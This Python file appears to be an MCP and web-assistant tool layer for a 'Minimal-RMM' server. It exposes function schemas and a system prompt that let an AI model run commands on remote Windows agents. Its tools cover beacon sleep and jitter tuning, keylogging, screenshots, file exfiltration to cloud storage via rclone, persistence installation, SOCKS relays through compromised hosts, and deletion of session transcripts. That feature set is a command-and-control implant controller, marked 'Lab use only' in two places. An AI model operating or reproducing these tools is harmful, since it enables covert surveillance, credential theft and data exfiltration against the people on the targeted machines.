"""
Shared RMM operator tools for MCP and web AI assistant.
Uses the same REST API as rmm_cli.py (RmmApiClient).
"""

from __future__ import annotations

import json
import os
from pathlib import Path
from typing import Any

from rmm_cli import RmmApiClient, _default_server_url

DEFAULT_RMM_URL = _default_server_url()
DEFAULT_RMM_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()


def make_client(
    base_url: str | None = None,
    token: str | None = None,
) -> RmmApiClient:
    resolved_token = DEFAULT_RMM_TOKEN if token is None else str(token).strip()
    if not resolved_token:
        resolved_token = DEFAULT_RMM_TOKEN
    return RmmApiClient(
        (base_url or DEFAULT_RMM_URL).rstrip("/"),
        resolved_token,
    )


def _json_result(payload: Any) -> str:
    return json.dumps(payload, indent=2, default=str)


def _resolve_session_id(client: RmmApiClient, session_ref: str) -> tuple[str | None, dict]:
    """Resolve full session id from prefix, full id, or hostname."""
    ref = (session_ref or "").strip()
    if not ref:
        return None, {"error": "session_ref required"}

    code, data = client.get_session(ref)
    if code == 200 and data.get("session"):
        return data["session"]["id"], data["session"]

    code, data = client.list_sessions()
    if code != 200:
        return None, {"error": "list_sessions failed", "detail": data}

    sessions = data.get("sessions", [])
    ref_upper = ref.upper()
    for s in sessions:
        if s["id"] == ref or s["id"].startswith(ref):
            return s["id"], s
    for s in sessions:
        if (s.get("hostname") or "").upper() == ref_upper:
            return s["id"], s
        if (s.get("hostname") or "").upper().startswith(ref_upper):
            return s["id"], s

    return None, {"error": "session_not_found", "session_ref": ref}


def tool_health(client: RmmApiClient) -> str:
    code, data = client.health(timeout=5)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_list_sessions(client: RmmApiClient) -> str:
    if not client.token:
        return _json_result({
            "ok": False,
            "status": 401,
            "error": "missing_api_token",
            "detail": "Set RMM_API_TOKEN (MCP env or web UI login Bearer token)",
        })
    code, data = client.list_sessions()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    sessions = data.get("sessions", [])
    summary = [
        {
            "id": s["id"],
            "id_prefix": s["id"][:8],
            "hostname": s.get("hostname"),
            "username": s.get("username"),
            "beacon_status": s.get("beacon_status"),
            "sleep_seconds": s.get("sleep_seconds"),
            "jitter_percent": s.get("jitter_percent"),
        }
        for s in sessions
    ]
    return _json_result({"ok": True, "count": len(summary), "sessions": summary})


def tool_get_session(client: RmmApiClient, session_ref: str) -> str:
    sid, info = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.get_session(sid)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({"ok": True, "session": data.get("session")})


def tool_exec_command(
    client: RmmApiClient,
    session_ref: str,
    command: str,
    timeout: float = 120,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.exec_command(sid, command, timeout=timeout)
    if code == 408:
        return _json_result({"ok": False, "error": "timeout", "command": command})
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    ev = data.get("event") or {}
    return _json_result({
        "ok": True,
        "command": command,
        "output": ev.get("body", ""),
        "event": ev,
    })


def tool_queue_command(
    client: RmmApiClient,
    session_ref: str,
    command: str,
    cmd_type: str = "oneshot",
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_command(sid, command, cmd_type=cmd_type)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "session_id": sid,
        "queued": command,
        "data": data,
    })


def tool_patch_config(
    client: RmmApiClient,
    session_ref: str,
    sleep_seconds: int | None = None,
    jitter_percent: int | None = None,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.patch_config(sid, sleep_seconds=sleep_seconds, jitter_percent=jitter_percent)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_get_events(
    client: RmmApiClient,
    session_ref: str,
    since: int = 0,
    limit: int = 50,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.get_events(sid, since=since, limit=limit)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({"ok": True, "session_id": sid, "events": data.get("events", [])})


def tool_kill_session(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.kill_session(sid)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_queue_download(client: RmmApiClient, session_ref: str, remote_path: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_download(sid, remote_path)
    return _json_result({"ok": code == 200, "status": code, "queued": remote_path, "data": data})


def tool_queue_exfil(
    client: RmmApiClient,
    session_ref: str,
    remote_path: str,
    profile: str | None = None,
    dest: str | None = None,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_exfil(sid, remote_path, profile=profile, dest=dest)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "queued": remote_path,
        "data": data,
    })


def tool_get_rclone_config(client: RmmApiClient) -> str:
    code, data = client.get_rclone_config()
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_queue_screenshot(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_screenshot(sid)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_queue_upload(
    client: RmmApiClient,
    session_ref: str,
    local_path: str,
    remote_path: str,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    local = Path(local_path).expanduser()
    if not local.is_file():
        return _json_result({"ok": False, "error": "local_file_not_found", "path": str(local)})
    code, data = client.upload_file(sid, str(local), remote_path)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "session_id": sid,
        "local_path": str(local),
        "remote_path": remote_path,
        "data": data,
    })


def tool_start_socks(
    client: RmmApiClient,
    session_ref: str,
    port: int = 1080,
    bind_host: str = "127.0.0.1",
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.start_socks(sid, port=port, bind_host=bind_host)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_stop_socks(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.stop_socks(sid)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_list_socks(client: RmmApiClient) -> str:
    code, data = client.list_socks()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    relays = data.get("relays", [])
    return _json_result({"ok": True, "count": len(relays), "relays": relays})


def tool_queue_persistent(client: RmmApiClient, session_ref: str, command: str) -> str:
    return tool_queue_command(client, session_ref, command, cmd_type="persistent")


def tool_stop_persistent(client: RmmApiClient, session_ref: str) -> str:
    return tool_queue_command(client, session_ref, "__STOP__", cmd_type="oneshot")


def _resolve_history_ref(client: RmmApiClient, session_ref: str) -> tuple[str | None, dict]:
    """Resolve archived session id from UUID prefix, full id, or hostname."""
    ref = (session_ref or "").strip()
    if not ref:
        return None, {"error": "session_ref required"}
    code, data = client.get_history_session(ref)
    if code == 200 and data.get("session"):
        sid = data["session"].get("session_id") or ref
        return sid, data["session"]
    code, data = client.list_history()
    if code != 200:
        return None, {"error": "history_lookup_failed", "detail": data}
    ref_upper = ref.upper()
    for row in data.get("sessions", []):
        sid = row.get("session_id", "")
        if sid == ref or sid.startswith(ref):
            return sid, row
        host = (row.get("hostname") or "").upper()
        if host == ref_upper or host.startswith(ref_upper):
            return sid, row
    return None, {"error": "history_not_found", "session_ref": ref}


def tool_list_history(client: RmmApiClient) -> str:
    code, data = client.list_history()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    sessions = data.get("sessions", [])
    return _json_result({"ok": True, "count": len(sessions), "sessions": sessions})


def tool_get_history_session(client: RmmApiClient, session_ref: str) -> str:
    sid, info = _resolve_history_ref(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.get_history_session(sid)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({"ok": True, "session_id": sid, "session": data.get("session")})


def tool_get_history_events(
    client: RmmApiClient,
    session_ref: str,
    since: int = 0,
    limit: int = 500,
) -> str:
    sid, info = _resolve_history_ref(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.get_history_events(sid, since=since, limit=limit)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({
        "ok": True,
        "session_id": data.get("session_id") or sid,
        "events": data.get("events", []),
    })


def tool_delete_history(client: RmmApiClient, session_ref: str) -> str:
    sid, info = _resolve_history_ref(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.delete_history(sid)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "session_id": sid,
        "data": data,
    })


def tool_list_session_downloads(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.list_session_downloads(sid)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    downloads = data.get("downloads", [])
    return _json_result({
        "ok": True,
        "session_id": data.get("session_id") or sid,
        "count": len(downloads),
        "downloads": downloads,
    })


def tool_get_agent_script(client: RmmApiClient) -> str:
    code, data = client.get_agent_script()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    content = data.get("content") or ""
    return _json_result({
        "ok": True,
        "filename": data.get("filename", "client_rmm.ps1"),
        "byte_length": len(content.encode("utf-8")),
        "line_count": content.count("\n") + (1 if content else 0),
        "content": content,
    })


def tool_queue_keylog(client: RmmApiClient, session_ref: str, action: str) -> str:
    act = (action or "").strip().lower()
    if act not in ("start", "stop", "dump"):
        return _json_result({
            "ok": False,
            "error": "invalid_action",
            "detail": "action must be start, stop, or dump",
        })
    return tool_queue_command(client, session_ref, f"__KEYLOG__ {act}", cmd_type="oneshot")


def tool_install_persistence(client: RmmApiClient, session_ref: str) -> str:
    return tool_queue_command(client, session_ref, "__INSTALL_PERSIST__", cmd_type="oneshot")


def tool_remove_persistence(client: RmmApiClient, session_ref: str) -> str:
    return tool_queue_command(client, session_ref, "__REMOVE_PERSIST__", cmd_type="oneshot")


TOOL_HANDLERS = {
    "health": lambda c, a: tool_health(c),
    "list_sessions": lambda c, a: tool_list_sessions(c),
    "get_session": lambda c, a: tool_get_session(c, a["session_ref"]),
    "exec_command": lambda c, a: tool_exec_command(
        c, a["session_ref"], a["command"], float(a.get("timeout", 120))
    ),
    "queue_command": lambda c, a: tool_queue_command(
        c, a["session_ref"], a["command"], a.get("cmd_type", "oneshot")
    ),
    "patch_config": lambda c, a: tool_patch_config(
        c,
        a["session_ref"],
        a.get("sleep_seconds"),
        a.get("jitter_percent"),
    ),
    "get_events": lambda c, a: tool_get_events(
        c, a["session_ref"], int(a.get("since", 0)), int(a.get("limit", 50))
    ),
    "kill_session": lambda c, a: tool_kill_session(c, a["session_ref"]),
    "queue_download": lambda c, a: tool_queue_download(c, a["session_ref"], a["remote_path"]),
    "queue_exfil": lambda c, a: tool_queue_exfil(
        c, a["session_ref"], a["remote_path"], a.get("profile"), a.get("dest")
    ),
    "get_rclone_config": lambda c, a: tool_get_rclone_config(c),
    "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
    "queue_upload": lambda c, a: tool_queue_upload(
        c, a["session_ref"], a["local_path"], a["remote_path"]
    ),
    "start_socks": lambda c, a: tool_start_socks(
        c,
        a["session_ref"],
        int(a.get("port", 1080)),
        str(a.get("bind_host", "127.0.0.1")),
    ),
    "stop_socks": lambda c, a: tool_stop_socks(c, a["session_ref"]),
    "list_socks": lambda c, a: tool_list_socks(c),
    "queue_persistent": lambda c, a: tool_queue_persistent(
        c, a["session_ref"], a["command"]
    ),
    "stop_persistent": lambda c, a: tool_stop_persistent(c, a["session_ref"]),
    "list_history": lambda c, a: tool_list_history(c),
    "get_history_session": lambda c, a: tool_get_history_session(c, a["session_ref"]),
    "get_history_events": lambda c, a: tool_get_history_events(
        c, a["session_ref"], int(a.get("since", 0)), int(a.get("limit", 500))
    ),
    "delete_history": lambda c, a: tool_delete_history(c, a["session_ref"]),
    "list_session_downloads": lambda c, a: tool_list_session_downloads(c, a["session_ref"]),
    "get_agent_script": lambda c, a: tool_get_agent_script(c),
    "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
    "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
    "remove_persistence": lambda c, a: tool_remove_persistence(c, a["session_ref"]),
}


def execute_tool(client: RmmApiClient, name: str, arguments: dict | str) -> str:
    if isinstance(arguments, str):
        arguments = json.loads(arguments) if arguments.strip() else {}
    handler = TOOL_HANDLERS.get(name)
    if not handler:
        return _json_result({"ok": False, "error": f"unknown_tool: {name}"})
    try:
        return handler(client, arguments)
    except Exception as e:
        return _json_result({"ok": False, "error": str(e)})


OPENAI_TOOLS: list[dict] = [
    {
        "type": "function",
        "function": {
            "name": "health",
            "description": "Check RMM server API health.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_sessions",
            "description": "List all active RMM agent sessions (id, hostname, user, beacon status).",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_session",
            "description": "Get session details by session id prefix, full id, or hostname.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {
                        "type": "string",
                        "description": "Session UUID prefix, full id, or hostname (e.g. CFRANCHETZIA110)",
                    }
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "exec_command",
            "description": "Run a command on the agent and wait for output (blocking, up to timeout seconds).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "command": {"type": "string"},
                    "timeout": {"type": "number", "description": "Max wait seconds (default 120)"},
                },
                "required": ["session_ref", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_command",
            "description": "Queue a command for the next agent beacon (non-blocking).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "command": {"type": "string"},
                    "cmd_type": {
                        "type": "string",
                        "enum": ["oneshot", "persistent"],
                        "description": "oneshot (default) or persistent",
                    },
                },
                "required": ["session_ref", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "patch_config",
            "description": "Update agent beacon sleep interval and/or jitter percent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "sleep_seconds": {"type": "integer"},
                    "jitter_percent": {"type": "integer"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_events",
            "description": "Fetch result/operator events for a session transcript.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "since": {"type": "integer", "description": "Event id cursor"},
                    "limit": {"type": "integer"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "kill_session",
            "description": "Terminate an agent session (client will exit on next beacon).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_download",
            "description": "Queue download of a remote file from the agent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "remote_path": {"type": "string"},
                },
                "required": ["session_ref", "remote_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_exfil",
            "description": "Queue upload of a remote agent file or folder via rclone (agent-side; link in events for files).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "remote_path": {"type": "string"},
                    "profile": {"type": "string", "description": "Named rclone profile on server"},
                    "dest": {"type": "string", "description": "Optional cloud destination path"},
                },
                "required": ["session_ref", "remote_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_rclone_config",
            "description": "Show rclone profiles and binary status on the RMM server.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_screenshot",
            "description": "Queue a screenshot capture on the agent.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_upload",
            "description": "Upload a local file (on the MCP host) to a remote path on the agent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "local_path": {"type": "string"},
                    "remote_path": {"type": "string"},
                },
                "required": ["session_ref", "local_path", "remote_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_socks",
            "description": "List all active SOCKS5 relays on the RMM server and which agent each uses.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "start_socks",
            "description": "Start SOCKS5 relay on the RMM server (traffic exits via agent).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "port": {"type": "integer", "description": "Default 1080"},
                    "bind_host": {"type": "string", "description": "Default 127.0.0.1"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "stop_socks",
            "description": "Stop SOCKS5 relay for the session.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_persistent",
            "description": "Set a persistent command on the agent (until stop_persistent).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "command": {"type": "string"},
                },
                "required": ["session_ref", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "stop_persistent",
            "description": "Stop the agent persistent command (__STOP__).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_history",
            "description": "List archived (ended) session transcripts.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_history_session",
            "description": "Get metadata for an archived session by id prefix, full id, or hostname.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_history_events",
            "description": "Fetch read-only event transcript for an archived session.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "since": {"type": "integer", "description": "Event id cursor"},
                    "limit": {"type": "integer", "description": "Max events (default 500)"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "delete_history",
            "description": "Permanently delete an archived session transcript from disk (ended sessions only).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_session_downloads",
            "description": "List files downloaded from the agent for a live session (artifact names and URLs).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_agent_script",
            "description": "Fetch the full client_rmm.ps1 agent script from the server (large payload).",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_keylog",
            "description": "Queue keylogger start, stop, or dump on the agent (__KEYLOG__).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "action": {
                        "type": "string",
                        "enum": ["start", "stop", "dump"],
                    },
                },
                "required": ["session_ref", "action"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "install_persistence",
            "description": "Queue agent persistence install (__INSTALL_PERSIST__). Lab use only.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remove_persistence",
            "description": "Queue agent persistence removal (__REMOVE_PERSIST__). Lab use only.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
]

SYSTEM_PROMPT = """You are an RMM (Remote Monitoring and Management) operator assistant.
You control Windows agents through the Minimal-RMM server API using the provided tools.

Guidelines:
- Use list_sessions first if you do not know which host to target.
- session_ref can be hostname, id prefix (first 8 chars), or full session UUID.
- Use list_history / get_history_events for archived (killed) session transcripts.
- Prefer exec_command when the user wants command output; use queue_command when beacon sleep is long.
- list_session_downloads shows completed agent→server file pulls; queue_download starts a new pull.
- Be concise; summarize command output for the user.
- Destructive actions (kill_session, delete_history) require clear user intent.
"""
